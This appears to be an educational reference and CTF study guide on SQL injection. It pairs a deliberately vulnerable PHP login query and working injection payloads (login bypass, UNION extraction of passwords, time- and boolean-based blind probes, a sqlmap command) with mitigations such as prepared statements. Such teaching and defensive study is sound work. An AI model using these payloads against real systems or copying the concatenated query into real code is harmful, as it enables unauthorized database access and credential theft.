# SQL Injection (SQLi)

## Overview
SQL Injection is a web security vulnerability that allows attackers to interfere with database queries by injecting malicious SQL code through user input fields. It consistently ranks in the OWASP Top 10 and can lead to unauthorized data access, data manipulation, and complete system compromise.

## How SQL Injection Works

### Vulnerable Code Example
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
This code directly concatenates user input into the SQL query without validation or sanitization.

Basic Attack Vectors
Authentication Bypass
Payload: admin' OR '1'='1
Resulting Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''
Impact: The condition '1'='1' is always true, bypassing authentication.

Union-Based Injection
Payload: ' UNION SELECT NULL, username, password FROM admin_users--
Purpose: Extract data from other tables by combining results with UNION.

Time-Based Blind SQLi
Payload: ' OR IF(1=1, SLEEP(5), 0)--
Detection: If the response is delayed by 5 seconds, injection is successful.

Boolean-Based Blind SQLi
Payload: ' AND 1=1-- (true condition)
Payload: ' AND 1=2-- (false condition)
Detection: Compare responses to infer database structure.

CTF Challenge Scenarios
Challenge 1: Login Bypass
Objective: Bypass authentication on a login form.
Hint: Try SQL comments (--, #) to ignore password checks.
Solution: Username: admin'--, Password: (anything)

Challenge 2: Extract Hidden Data
Objective: Retrieve the admin password from the database.
Hint: Use UNION to combine query results.
Solution: ' UNION SELECT 1,username,password FROM users WHERE role='admin'--

Challenge 3: Blind SQLi Flag Extraction
Objective: Extract the flag character by character using time delays.
Technique: ' OR IF(SUBSTRING((SELECT flag FROM secrets),1,1)='f', SLEEP(2), 0)--

Detection Methods
Manual Testing
Input special characters: ', ", ;, --, /**/

Look for SQL error messages

Test boolean conditions: ' AND 1=1-- vs ' AND 1=2--

Time-based payloads: ' OR SLEEP(5)--

Automated Tools
sqlmap: sqlmap -u "http://target.com/page?id=1" --batch --banner

Burp Suite: Use Scanner and Intruder for payload injection

Mitigation Strategies
1. Parameterized Queries (Prepared Statements)
text
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
2. Input Validation
python
import re
if not re.match("^[a-zA-Z0-9_]+$", username):
    raise ValueError("Invalid username")
3. Least Privilege Principle
Grant database users only necessary permissions. Never use root or admin accounts for web applications.

4. Web Application Firewall (WAF)
Deploy WAF rules to detect and block common SQLi patterns.

5. Error Handling
Never display raw SQL errors to users. Log errors server-side only.

OWASP Resources
OWASP SQL Injection Prevention Cheat Sheet

OWASP Testing Guide: Testing for SQL Injection

OWASP Top 10 2021: A03 Injection